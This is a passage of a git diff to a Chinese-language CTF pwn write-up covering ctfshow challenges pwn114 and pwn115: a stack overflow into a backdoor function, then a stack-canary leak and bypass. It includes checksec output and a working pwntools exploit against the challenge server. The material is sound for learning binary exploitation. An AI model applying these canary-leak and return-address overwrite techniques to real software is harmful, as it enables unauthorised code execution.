@@ -3964,6 +3964,85 @@ io.interactive()
 
 为什么不扔0x420个A进去？
 
+## pwn114
+
+IDA打开看main函数
+
+逻辑是输入Yes就能getchar然后进ctfshow函数
+
+ctfshow函数存在很明显的栈溢出漏洞
+
+溢出长度是256
+
+同时可以看到存在后门函数flagishere
+
+具体原理可以参考大佬博客 [CTFShow bypass安全机制-CSDN博客](https://blog.csdn.net/KaliLinux_V/article/details/145963321)
+
+基本上溢出就能拿到flag
+
+cyclic 256填入直接纯nc交互就好
+
+没必要exp
+
+## pwn115
+
+canary bypass第一题
+
+main没东西
+
+看ctfshow
+
+ctfshow函数存在栈溢出漏洞
+
+另外还找到了后门函数backdoor
+
+如果没canary就是普通栈溢出打ret2text了
+
+但是有canary
+
+```shell
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+众所不周知，32位canary是4位，64是8位
+
+东西挺常规的
+
+泄露canary构造含canary的新payload
+
+exp:
+
+```python
+from pwn import *
+io = remote("pwn.challenge.ctf.show",28110)
+payload = b'a' * (200)
+io.sendline(payload)
+
+# 泄漏canary
+io.recvuntil(b'a'*200)
+canary = u32(io.recv(4)) - 0xa    #这里的0xa减去的是换行符，10对着的就是\n嘛
+print(hex(canary))
+
+#利用canary，填入新payload
+payload += p32(canary)
+payload += b'a' * 12             #unsigned int v3; // [esp+CCh] [ebp-Ch] 这里说明了canary的值距离栈底都还差0xC = 12，所以为了触底，加段垃圾数据
+payload += p32(0x80485A6)      
+
+io.sendline(payload)
+io.interactive()
+```
+
+v3就是canary，在ctfshow的最底下返回的就是v3和传入内容后canary位置的异或结果
+
+相同就没事，不同就抛出异常而已，还是很常规
+
+其他东西没什么好说的
+
 # 复现平台
 
 ### ret2text
